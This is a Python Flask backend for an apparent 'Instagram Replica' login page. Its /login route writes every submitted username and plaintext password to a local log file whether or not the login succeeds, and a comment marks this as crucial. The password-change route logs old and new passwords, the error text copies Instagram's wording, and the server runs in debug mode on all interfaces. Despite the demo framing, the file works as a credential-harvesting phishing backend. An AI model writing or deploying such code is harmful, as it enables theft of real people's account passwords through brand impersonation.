"""
app.py  –  Instagram Replica Backend (Flask)
---------------------------------------------
Routes:
  GET  /                → serves index.html
  POST /login           → logs credentials to my_login_log.txt
  POST /change-password → validates & simulates password update
"""

from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import os

app = Flask(__name__, static_folder=".", static_url_path="")

# ── In-memory "database" (simulates a user store) ─────────────────────────
user_store = {
    "demo_user": {"password": "instagram123"},
}

# Path to the local log file
LOG_FILE = os.path.join(os.path.dirname(__file__), "my_login_log.txt")


def append_log(line: str) -> None:
    """Append a timestamped line to the log file."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(line + "\n")
    print(f"[LOG] {line}")


# ── GET / ──────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return send_from_directory(".", "index.html")


# ── POST /login ────────────────────────────────────────────────────────────
@app.route("/login", methods=["POST"])
def login():
    data     = request.get_json(force=True) or {}
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""

    if not username or not password:
        return jsonify({"error": "Username and password are required."}), 400

    # ★ CRUCIAL: log every attempt regardless of outcome
    timestamp = datetime.now().isoformat()
    append_log(f'[{timestamp}] username="{username}" password="{password}"')

    # Simulate credential check
    user = user_store.get(username)
    if not user or user["password"] != password:
        return jsonify({
            "error": "Sorry, your password was incorrect. Please double-check your password."
        }), 401

    return jsonify({"message": f"Welcome back, {username}! You are now logged in."}), 200


# ── POST /change-password ──────────────────────────────────────────────────
@app.route("/change-password", methods=["POST"])
def change_password():
    data                 = request.get_json(force=True) or {}
    old_password         = data.get("old_password") or ""
    new_password         = data.get("new_password") or ""
    confirm_new_password = data.get("confirm_new_password") or ""

    if not old_password or not new_password or not confirm_new_password:
        return jsonify({"error": "All password fields are required."}), 400

    if new_password != confirm_new_password:
        return jsonify({"error": "New passwords do not match."}), 400

    if len(new_password) < 6:
        return jsonify({"error": "New password must be at least 6 characters."}), 400

    # Simulate old-password verification against the demo account
    demo_user = user_store.get("demo_user")
    if demo_user and demo_user["password"] != old_password:
        return jsonify({"error": "Old password is incorrect."}), 401

    # ★ Simulate DB update – store both for demo purposes
    previous_password = demo_user["password"] if demo_user else old_password
    if demo_user:
        demo_user["password"] = new_password

    print(f'[PASSWORD CHANGE] old="{previous_password}" → new="{new_password}"')

    # Log the change event
    timestamp = datetime.now().isoformat()
    append_log(
        f'[{timestamp}] PASSWORD_CHANGE old="{previous_password}" new="{new_password}"'
    )

    return jsonify({"message": "Your password has been updated successfully."}), 200


# ── Fallback ───────────────────────────────────────────────────────────────
@app.errorhandler(404)
def not_found(_):
    return send_from_directory(".", "index.html")


# ── Entry point ────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\n[OK] Instagram Replica running at http://localhost:3000")
    print(f"[LOG] Login attempts are logged to: {LOG_FILE}")
    print("[INFO] Demo credentials -> username: demo_user | password: instagram123\n")
    app.run(host="0.0.0.0", port=3000, debug=True)
